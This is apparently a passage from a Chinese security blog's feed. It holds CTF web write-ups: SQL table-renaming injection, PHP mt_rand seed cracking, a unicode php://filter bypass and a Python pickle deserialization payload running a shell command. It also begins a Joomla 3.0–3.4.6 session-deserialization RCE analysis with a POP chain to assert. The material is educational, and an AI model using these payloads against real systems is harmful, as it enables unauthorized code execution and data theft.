alt=""></p><p>现在基本上清楚了数据库中表的结构，由于不能使用<code>select</code>，这里使用<code>alter</code>将<code>words</code>表换成<code>1919810931114514</code>，然后添加id字段，同时将<code>flag</code>字段改名为<code>data</code>字段，这样通过查询就可以直接拿到<code>flag</code>,语句如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">RENAME</span> <span class="keyword">TO</span> moli;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">RENAME</span> <span class="keyword">TO</span> words;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">ADD</span> <span class="keyword">id</span> <span class="built_in">CHAR</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="string">'1'</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> words <span class="keyword">CHANGE</span> flag <span class="keyword">data</span> <span class="built_in">BIGINT</span>;</span><br></pre></td></tr></table></figure><p>直接查询</p><p><img src="/2019/12/30/积累的一些web题目/10.png" alt=""></p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><blockquote><p>考点：伪随机数</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/2.png" alt=""></p><p>控制台查看网络来到<code>check.php</code>，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p id='p1'&gt;"</span>.$str_show.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'num'</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">"check.php"</span>);</span><br></pre></td></tr></table></figure><p>这是个经典的伪随机数问题，可以参考该文章：<a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></p><p>将得到的部分字母还原成随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass_now = <span class="string">"W0dCwtjQ3A"</span>;</span><br><span class="line">$allowable_characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>;</span><br><span class="line">$len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($pass_now); $j++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($pass_now[$j] == $allowable_characters[$i]) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"$i $i 0 $len "</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破种子</p><p><img src="/2019/12/30/积累的一些web题目/3.png" alt=""></p><p>得到了在7.1版本下的种子，然后对完整的字符串进行还原，注意要在7.1版本下运行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">237387795</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/4.png" alt=""></p><p>重点源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//query.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure><p>我们需要以<code>json</code>的格式传入想读的文件名，但存在<code>is_valid</code>函数进行安全检查，这里可使用unicode进行绕过，同时为了避免文件内容有拦截，可以进行编码，例如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"page"</span>:<span class="string">"php\u003a//filter/convert.base64-encode/resource=/fl\u0061g"</span>&#125;</span><br></pre></td></tr></table></figure><p>在线转换</p><p><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><blockquote><p>考点：jwt伪造，pickle</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/11.png" alt=""></p><p>首先要我们购买<code>lv6</code>，开始寻找<code>lv6</code>所在页面，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://6664045a-dfa6-4a6c-9ffb-bb0cd3a6a5d2.node3.buuoj.cn/shop?page="</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    url1 = url + str(i)</span><br><span class="line">    print(<span class="string">'================================='</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = s.get(url1)</span><br><span class="line">        print(html.status_code)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            print(url1)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-]ERROR'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>发现在<code>181</code>页，购买时发现账户中的金额不足，抓包去修改折扣数值，将其改小一些，例如<code>0.0000001</code>，购买后提示我们不是<code>admin</code>，进而查看当前<code>cookie</code>，发现是<code>jwt</code>，拿出来爆破一下密钥</p><p><img src="/2019/12/30/积累的一些web题目/12.png" alt=""></p><p>将<code>cookie</code>替换，查看源码，给了源码泄露的地址，下载下来审计一下，发现了反序列化的点</p><p><img src="/2019/12/30/积累的一些web题目/13.png" alt="13"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#return (eval, ("open('/flag.txt','r').read()",))</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"__import__('os').popen('cat /flag.txt').read()"</span>,))</span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/14.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GXYCTF2019-BabySQli&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabySQli&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabySQli&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabySQli&lt;/h2&gt;&lt;bl
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>joomla3.4.6-rce分析</title>
    <link href="https://yml-sec.top/2019/10/15/joomla3-4-6-rce%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/10/15/joomla3-4-6-rce%E5%88%86%E6%9E%90/</id>
    <published>2019-10-15T13:50:51.000Z</published>
    <updated>2019-10-23T14:18:32.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间意大利安全研究员Alessandro Groppo 公开了joomla3.0.0-3.4.6的漏洞详情，今天借此机会复现分析一下</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>漏洞根本上来说是源于session的反序列化，在joomla中有一套自己的session处理机制，当产生会话的时候，joomla会将序列化后的数据存储在数据库中，然后将数据从数据库中取出来进行反序列化</p><p>写函数: <code>\libraries\joomla\session\storage\database.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Write session data to the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id    The session identifier.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $data  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  boolean  True on success, false otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line">$data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;update($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'data'</span>) . <span class="string">' = '</span> . $db-&gt;quote($data))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'time'</span>) . <span class="string">' = '</span> . $db-&gt;quote((int) time()))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to update the session data in the database table.</span></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$db-&gt;execute())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Since $db-&gt;execute did not throw an exception, so the query was successful.</span></span><br><span class="line"><span class="comment">Either the data changed, or the data was identical.</span></span><br><span class="line"><span class="comment">In either case we are done.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读函数：<code>\libraries\joomla\session\storage\database.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Read the data for a particular session identifier from the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id  The session identifier.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  string  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Get the session data from the database table.</span></span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;select($db-&gt;quoteName(<span class="string">'data'</span>))</span><br><span class="line">-&gt;from($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span class="line">$result = (string) $db-&gt;loadResult();</span><br><span class="line"></span><br><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，在write函数中</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = str_replace(<span class="built_in">chr</span>(<span class="number">0</span>) . <span class="string">'*'</span> . <span class="built_in">chr</span>(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>会将<code>/x00*/x00</code> 替换为 <code>\0\0\0</code> ,因为protected修饰的变量在序列化后会带有<code>/x00*/x00</code> 而mysql中无法对<code>NULL</code>值进行存储，所以会对该处进行替换</p><p>为了保持数据完整性自然会在read函数中将<code>/x00*/x00</code>替换回来，就是下面这句</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, <span class="built_in">chr</span>(<span class="number">0</span>) . <span class="string">'*'</span> . <span class="built_in">chr</span>(<span class="number">0</span>), $result)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>到这里就会出现一个问题，如果写入的反序列化字符串存在<code>/0/0/0</code>，当read函数读取的时候，就会将其替换成<code>\x00*\x00</code>这样输入的字符串就少了三个字符，如下程序</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$result = <span class="string">'admin\0\0\0admin'</span>;</span><br><span class="line">$result = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $result);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure><p>该段输出为<code>adminN*Nadmin</code>，很轻易看出少了三个字符，这样在session反序列化时由于前面声明的字符串长度并未改变，所以会吃掉后面的三个字符，这样我们就可以通过这个利用点将两处反序列化中间的字段吃掉，使第二部分内容逃出来进行反序列化。</p><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><p>起始触发点为 <code>/libraries/joomla/database/driver/mysqli.php</code>中的<code>__destruct()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;disconnect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>disconnect();</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">disconnect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Close the connection.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;connection) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;disconnectHandlers <span class="keyword">as</span> $h) &#123;</span><br><span class="line">            call_user_func_array($h, <span class="keyword">array</span>(&amp;<span class="keyword">$this</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="keyword">$this</span>-&gt;connection);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;connection = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>$this-&gt;connection</code>为<code>true</code> ，这里注意到 <code>call_user_func_array($h, array(&amp;$this));</code></p><p>其中第二个参数无法控制，所以我们无法在此处实现<code>assert</code>的回调执行，于是来寻找其他类是否有可以利用的的方法。</p><p>这里找到了<code>SimplePie</code>类的<code>init</code>方法，路径为<code>/libraries/simplepie/simplepie.php</code>，主要代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span> || <span class="keyword">$this</span>-&gt;raw_data !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">$this</span>-&gt;multifeed_objects = <span class="keyword">array</span>();</span><br><span class="line">$cache = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;feed_url !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$parsed_feed_url = SimplePie_Misc::parse_url(<span class="keyword">$this</span>-&gt;feed_url);</span><br><span class="line"><span class="comment">// Decide whether to enable caching</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;cache &amp;&amp; $parsed_feed_url[<span class="string">'scheme'</span>] !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line">$cache = call_user_func(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;cache_class, <span class="string">'create'</span>), <span class="keyword">$this</span>-&gt;cache_location, call_user_func(<span class="keyword">$this</span>-&gt;cache_name_function, <span class="keyword">$this</span>-&gt;feed_url), <span class="string">'spc'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以控制<code>call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url)</code>的两个参数，这样就可以使用<code>assert</code>函数回调进行任意代码执行，同时这里需要满足上面的几个<code>if</code>条件</p><p>目前找到了执行任意命令的路径，最后一个问题就是joomla默认是没有载入<code>SimplePie</code>类的，所以这里使用了<code>JSimplepieFactory</code>类，该类在加载时会自动将<code>SimplePie</code>类导入当前环境，关键语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jimport(<span 